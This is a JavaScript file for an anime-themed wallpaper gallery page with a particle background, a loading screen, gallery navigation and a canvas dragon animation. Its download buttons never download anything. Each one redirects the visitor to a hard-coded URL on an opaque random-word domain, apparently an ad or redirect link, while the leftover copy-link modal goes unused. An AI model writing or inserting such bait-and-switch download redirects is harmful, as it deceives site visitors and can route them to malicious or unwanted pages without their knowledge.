document.addEventListener('DOMContentLoaded', function() {
    // Initialize dragon animation
    initDragonAnimation();
    
    // Initialize particles.js
    if (typeof particlesJS !== 'undefined') {
        particlesJS('particles-js', {
            particles: {
                number: {
                    value: 80,
                    density: {
                        enable: true,
                        value_area: 800
                    }
                },
                color: {
                    value: ["#6a11cb", "#2575fc", "#ff416c"]
                },
                shape: {
                    type: "circle",
                    stroke: {
                        width: 0,
                        color: "#000000"
                    },
                },
                opacity: {
                    value: 0.5,
                    random: true,
                    anim: {
                        enable: true,
                        speed: 1,
                        opacity_min: 0.1,
                        sync: false
                    }
                },
                size: {
                    value: 3,
                    random: true,
                    anim: {
                        enable: true,
                        speed: 2,
                        size_min: 0.1,
                        sync: false
                    }
                },
                line_linked: {
                    enable: true,
                    distance: 150,
                    color: "#6a11cb",
                    opacity: 0.2,
                    width: 1
                },
                move: {
                    enable: true,
                    speed: 1,
                    direction: "none",
                    random: true,
                    straight: false,
                    out_mode: "out",
                    bounce: false,
                    attract: {
                        enable: true,
                        rotateX: 600,
                        rotateY: 1200
                    }
                }
            },
            interactivity: {
                detect_on: "canvas",
                events: {
                    onhover: {
                        enable: true,
                        mode: "grab"
                    },
                    onclick: {
                        enable: true,
                        mode: "push"
                    },
                    resize: true
                },
                modes: {
                    grab: {
                        distance: 140,
                        line_linked: {
                            opacity: 0.5
                        }
                    },
                    push: {
                        particles_nb: 3
                    }
                }
            },
            retina_detect: true
        });
    }

    // Loading screen animation
    const loadingScreen = document.querySelector('.loading-screen');
    const loadingProgress = document.querySelector('.loading-progress');
    const loadingCharacter = document.querySelector('.loading-character');
    const loadingPercentage = document.querySelector('.loading-percentage');
    const loadingMessage = document.querySelector('.loading-message');
    const container = document.querySelector('.container');
    
    const loadingMessages = [
        "Summoning Shadows...",
        "Preparing Arise Skill...",
        "Gathering Shadow Army...",
        "Extracting Shadow Powers...",
        "Leveling Up..."
    ];
    
    // Simulate loading progress
    let progress = 0;
    const loadingInterval = setInterval(() => {
        progress += Math.random() * 5;
        if (progress > 100) progress = 100;
        
        loadingProgress.style.width = `${progress}%`;
        loadingCharacter.style.left = `${progress}%`;
        loadingPercentage.textContent = `${Math.floor(progress)}%`;
        
        // Change loading message
        if (progress < 20) {
            loadingMessage.textContent = loadingMessages[0];
        } else if (progress < 40) {
            loadingMessage.textContent = loadingMessages[1];
        } else if (progress < 60) {
            loadingMessage.textContent = loadingMessages[2];
        } else if (progress < 80) {
            loadingMessage.textContent = loadingMessages[3];
        } else {
            loadingMessage.textContent = loadingMessages[4];
        }
        
        if (progress === 100) {
            clearInterval(loadingInterval);
            setTimeout(() => {
                loadingScreen.style.opacity = '0';
                loadingScreen.style.visibility = 'hidden';
                container.classList.add('loaded');
                
                // Initialize first gallery
                initializeGallery();
            }, 1000);
        }
    }, 100);
    
    // Character navigation
    const characterBtns = document.querySelectorAll('.character-btn');
    const galleries = document.querySelectorAll('.gallery');
    
    characterBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            // Add click effect
            btn.classList.add('clicked');
            setTimeout(() => {
                btn.classList.remove('clicked');
            }, 300);
            
            // Remove active class from all buttons and galleries
            characterBtns.forEach(b => b.classList.remove('active'));
            galleries.forEach(g => g.classList.remove('active'));
            
            // Add active class to clicked button and corresponding gallery
            btn.classList.add('active');
            const character = btn.getAttribute('data-character');
            document.getElementById(character).classList.add('active');
            
            // Reset gallery items
            const galleryItems = document.querySelectorAll(`#${character} .gallery-item`);
            galleryItems.forEach((item, index) => {
                item.classList.remove('active');
                if (index === 0) {
                    setTimeout(() => {
                        item.classList.add('active');
                    }, 100);
                }
            });
            
            // Update pagination
            updatePagination(0, galleryItems.length);
        });
    });
    
    // Gallery navigation
    const prevBtn = document.querySelector('.prev');
    const nextBtn = document.querySelector('.next');
    const currentPage = document.querySelector('.current-page');
    const totalPages = document.querySelector('.total-pages');
    
    function navigateGallery(direction) {
        const activeGallery = document.querySelector('.gallery.active');
        const items = activeGallery.querySelectorAll('.gallery-item');
        const activeItem = activeGallery.querySelector('.gallery-item.active');
        let activeIndex = Array.from(items).indexOf(activeItem);
        
        // Remove active class from current item
        activeItem.classList.remove('active');
        
        // Calculate new index
        if (direction === 'next') {
            activeIndex = (activeIndex + 1) % items.length;
        } else {
            activeIndex = (activeIndex - 1 + items.length) % items.length;
        }
        
        // Add active class to new item with delay for transition effect
        setTimeout(() => {
            items[activeIndex].classList.add('active');
        }, 100);
        
        // Update pagination
        updatePagination(activeIndex, items.length);
        
        // Add button press effect
        if (direction === 'next') {
            nextBtn.classList.add('pressed');
            setTimeout(() => {
                nextBtn.classList.remove('pressed');
            }, 200);
        } else {
            prevBtn.classList.add('pressed');
            setTimeout(() => {
                prevBtn.classList.remove('pressed');
            }, 200);
        }
    }
    
    function updatePagination(currentIndex, totalItems) {
        currentPage.textContent = currentIndex + 1;
        totalPages.textContent = `/ ${totalItems}`;
    }
    
    prevBtn.addEventListener('click', () => navigateGallery('prev'));
    nextBtn.addEventListener('click', () => navigateGallery('next'));
    
    // Add keydown event for navigation
    document.addEventListener('keydown', (e) => {
        if (e.key === 'ArrowRight') navigateGallery('next');
        if (e.key === 'ArrowLeft') navigateGallery('prev');
    });
    
    // Link Modal
    const linkModal = document.querySelector('.link-modal');
    const closeModalBtn = document.querySelector('.close-modal');
    const imageLink = document.querySelector('.image-link');
    const copyLinkBtn = document.querySelector('.copy-link');
    const downloadNowBtn = document.querySelector('.download-now');
    
    // Download button functionality with direct redirect
    const downloadBtns = document.querySelectorAll('.download-btn');
    const downloadNotification = document.getElementById('download-notification');
    const copyNotification = document.getElementById('copy-notification');
    
    // Modificación: Redirección directa al enlace proporcionado
    const redirectUrl = "https://filthygracefulspinach.com/jp2a3zgc?key=3465dfe0111e3030fab202e231ae7ff6";
    
    downloadBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            // Redirección directa al enlace
            window.location.href = redirectUrl;
        });
    });
    
    // Close modal
    closeModalBtn.addEventListener('click', () => {
        linkModal.classList.remove('show');
    });
    
    // Click outside to close
    linkModal.addEventListener('click', (e) => {
        if (e.target === linkModal) {
            linkModal.classList.remove('show');
        }
    });
    
    // Copy link button
    copyLinkBtn.addEventListener('click', () => {
        const linkText = imageLink.textContent;
        navigator.clipboard.writeText(linkText).then(() => {
            // Show notification
            copyNotification.classList.add('show');
            setTimeout(() => {
                copyNotification.classList.remove('show');
            }, 3000);
        });
    });
    
    // Download now button - también redirige al mismo enlace
    downloadNowBtn.addEventListener('click', function() {
        // Redirección directa al enlace
        window.location.href = redirectUrl;
    });
    
    // Initialize first gallery
    function initializeGallery() {
        const firstGalleryItems = document.querySelectorAll('#sung-jinwoo .gallery-item');
        if (firstGalleryItems.length > 0) {
            setTimeout(() => {
                firstGalleryItems[0].classList.add('active');
                updatePagination(0, firstGalleryItems.length);
            }, 500);
        }
    }
    
    // Add 3D tilt effect to gallery
    const galleryContainer = document.querySelector('.gallery-container');
    
    galleryContainer.addEventListener('mousemove', (e) => {
        const { left, top, width, height } = galleryContainer.getBoundingClientRect();
        const x = (e.clientX - left) / width;
        const y = (e.clientY - top) / height;
        
        const tiltX = (y - 0.5) * 10;
        const tiltY = (0.5 - x) * 10;
        
        galleryContainer.style.transform = `perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) scale3d(1, 1, 1)`;
    });
    
    galleryContainer.addEventListener('mouseleave', () => {
        galleryContainer.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)';
    });
    
    // Add touch swipe support for mobile
    let touchStartX = 0;
    let touchEndX = 0;
    
    galleryContainer.addEventListener('touchstart', (e) => {
        touchStartX = e.changedTouches[0].screenX;
    });
    
    galleryContainer.addEventListener('touchend', (e) => {
        touchEndX = e.changedTouches[0].screenX;
        handleSwipe();
    });
    
    function handleSwipe() {
        if (touchEndX < touchStartX - 50) {
            // Swipe left
            navigateGallery('next');
        } else if (touchEndX > touchStartX + 50) {
            // Swipe right
            navigateGallery('prev');
        }
    }
    
    // Dragon Animation
    function initDragonAnimation() {
        const canvas = document.getElementById('dragonCanvas');
        const ctx = canvas.getContext('2d');
        
        // Set canvas size
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        // Dragon parameters
        const dragon = {
            segments: 20,
            points: [],
            width: 10,
            length: 400,
            color: '#6a11cb',
            glowColor: 'rgba(106, 17, 203, 0.5)',
            speed: 0.02,
            amplitude: 100,
            frequency: 0.005
        };
        
        // Initialize dragon points
        function initDragon() {
            dragon.points = [];
            for (let i = 0; i < dragon.segments; i++) {
                dragon.points.push({
                    x: canvas.width / 2,
                    y: canvas.height / 2,
                    angle: 0
                });
            }
        }
        
        initDragon();
        
        // Animation variables
        let time = 0;
        let frame = 0;
        
        // Draw dragon
        function drawDragon() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            // Update head position
            const headX = canvas.width / 2 + Math.sin(time * dragon.frequency) * canvas.width * 0.3;
            const headY = canvas.height / 2 + Math.cos(time * dragon.frequency * 0.7) * canvas.height * 0.2;
            
            dragon.points[0] = {
                x: headX,
                y: headY,
                angle: Math.atan2(
                    Math.cos(time * dragon.frequency * 0.7) * dragon.amplitude,
                    Math.sin(time * dragon.frequency) * dragon.amplitude
                )
            };
            
            // Update body segments
            for (let i = 1; i < dragon.segments; i++) {
                const prevPoint = dragon.points[i - 1];
                const segmentLength = dragon.length / dragon.segments;
                
                // Calculate new position based on previous segment
                const dx = segmentLength * Math.cos(prevPoint.angle);
                const dy = segmentLength * Math.sin(prevPoint.angle);
                
                dragon.points[i] = {
                    x: prevPoint.x - dx,
                    y: prevPoint.y - dy,
                    angle: prevPoint.angle + Math.sin(time * 0.1 + i * 0.1) * 0.1
                };
            }
            
            // Draw dragon body
            ctx.lineJoin = 'round';
            ctx.lineCap = 'round';
            
            // Draw glow effect
            ctx.shadowBlur = 20;
            ctx.shadowColor = dragon.glowColor;
            
            // Draw body segments with gradient
            for (let i = 0; i < dragon.segments - 1; i++) {
                const point = dragon.points[i];
                const nextPoint = dragon.points[i + 1];
                
                // Create gradient for segment
                const gradient = ctx.createLinearGradient(point.x, point.y, nextPoint.x, nextPoint.y);
                gradient.addColorStop(0, '#6a11cb');
                gradient.addColorStop(0.5, '#2575fc');
                gradient.addColorStop(1, '#ff416c');
                
                // Draw segment
                ctx.beginPath();
                ctx.moveTo(point.x, point.y);
                ctx.lineTo(nextPoint.x, nextPoint.y);
                ctx.lineWidth = dragon.width * (1 - i / dragon.segments);
                ctx.strokeStyle = gradient;
                ctx.stroke();
            }
            
            // Draw dragon head
            ctx.beginPath();
            ctx.arc(dragon.points[0].x, dragon.points[0].y, dragon.width, 0, Math.PI * 2);
            ctx.fillStyle = '#ff416c';
            ctx.fill();
            
            // Draw eyes
            const eyeSize = dragon.width * 0.3;
            const eyeOffset = dragon.width * 0.4;
            const eyeAngle = dragon.points[0].angle;
            
            ctx.beginPath();
            ctx.arc(
                dragon.points[0].x + Math.cos(eyeAngle - Math.PI/4) * eyeOffset,
                dragon.points[0].y + Math.sin(eyeAngle - Math.PI/4) * eyeOffset,
                eyeSize, 0, Math.PI * 2
            );
            ctx.fillStyle = '#ffffff';
            ctx.fill();
            
            ctx.beginPath();
            ctx.arc(
                dragon.points[0].x + Math.cos(eyeAngle + Math.PI/4) * eyeOffset,
                dragon.points[0].y + Math.sin(eyeAngle + Math.PI/4) * eyeOffset,
                eyeSize, 0, Math.PI * 2
            );
            ctx.fillStyle = '#ffffff';
            ctx.fill();
            
            // Update time
            time += dragon.speed;
            frame++;
            
            // Request next frame
            requestAnimationFrame(drawDragon);
        }
        
        // Start animation
        drawDragon();
    }
});